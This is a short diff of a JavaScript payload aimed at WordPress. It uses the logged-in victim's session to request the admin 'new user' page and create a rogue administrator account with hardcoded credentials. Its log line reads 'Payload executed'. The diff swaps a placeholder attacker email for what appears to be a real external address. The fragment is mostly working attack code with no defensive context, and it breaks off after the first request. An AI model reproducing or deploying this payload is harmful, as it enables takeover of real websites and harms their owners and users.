@@ -1,7 +1,7 @@
 (function() {
     const newUsername = 'team-developer';
     const newPassword = 'Vendetta2025@@';
-    const newEmail = 'vendetta@pwned.local'; 
+    const newEmail = 'belutgaban@protonmail.me'; 
     console.log("Payload executed. Attempting to create admin user...");
     fetch('/wp-admin/user-new.php', { credentials: 'include' })
         .then(response => response.text())
